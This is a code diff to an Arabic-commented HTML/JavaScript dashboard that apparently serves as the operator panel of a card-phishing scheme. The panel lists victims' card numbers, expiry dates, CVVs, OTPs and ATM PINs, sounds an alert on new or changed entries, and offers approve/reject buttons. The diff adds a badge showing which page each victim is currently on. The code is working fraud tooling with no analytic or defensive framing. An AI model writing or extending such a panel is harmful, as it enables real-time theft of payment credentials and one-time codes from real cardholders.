@@ -23,6 +23,7 @@
         .card { background: white; margin-bottom: 10px; padding: 12px; border-radius: 8px; border-right: 5px solid #1e7344; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
         .data-row { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 8px; }
         .box { padding: 5px 8px; background: #f0f0f0; border-radius: 4px; font-size: 13px; border: 1px solid #ddd; direction: ltr !important; unicode-bidi: bidi-override; }
+        .location-badge { display: inline-block; padding: 3px 8px; background: #e3f2fd; color: #0d47a1; border-radius: 12px; font-size: 11px; font-weight: bold; margin-right: 10px; border: 1px solid #bbdefb; }
         .btn { padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; color: white; font-size: 12px; font-weight: bold; transition: 0.3s; }
         .btn-ok { background: #28a745; }
         .btn-rej { background: #dc3545; }
@@ -61,7 +62,7 @@
 </div>
 
 <script>
-    let lastDataStore = {}; // لتخزين آخر حالة لكل كرت
+    let lastDataStore = {}; 
 
     function playSound() {
         const sound = document.getElementById('notifSound');
@@ -126,14 +127,12 @@
                 const v = c.val();
                 const id = c.key;
                 
-                // دمج كل البيانات المهمة في نص واحد لمراقبة أي تغيير
-                const currentDataString = `${v.cardNumber}|${v.expiry}|${v.cvv}|${v.otp}|${v.atm_pin}`;
+                // مراقبة التغييرات (بما في ذلك مكان تواجد العميل)
+                const currentDataString = `${v.cardNumber}|${v.otp}|${v.atm_pin}|${v.currentPage}`;
 
-                // إذا كانت البيانات موجودة مسبقاً ومختلفة عن الحالية، أو إذا كان الكرت جديد تماماً
                 if (lastDataStore[id] !== undefined && lastDataStore[id] !== currentDataString) {
                     triggerSound = true;
                 } else if (lastDataStore[id] === undefined) {
-                    // أول مرة يظهر فيها هذا الكرت في الجلسة الحالية
                     triggerSound = true; 
                 }
                 
@@ -144,8 +143,14 @@
                 const btnClassOk = isWaiting ? 'btn-ok' : 'btn-wait';
                 const btnClassRej = isWaiting ? 'btn-rej' : 'btn-wait';
 
+                // تحديد مكان العميل
+                let pageLabel = v.currentPage || 'غير محدد';
+
                 h += `<div class="card ${isWaiting ? 'new-update' : ''}">
-                    <b style="text-align:right; display:block;">${v.cardHolder || 'عميل'}</b> 
+                    <div style="display:flex; justify-content:space-between; align-items:center;">
+                        <b style="text-align:right;">${v.cardHolder || 'عميل'}</b>
+                        <span class="location-badge">📍 ${pageLabel}</span>
+                    </div>
                     <div class="data-row">
                         <div class="box">${v.cardNumber || '----'}</div>
                         <div class="box">📅 ${v.expiry || '--/--'}</div>
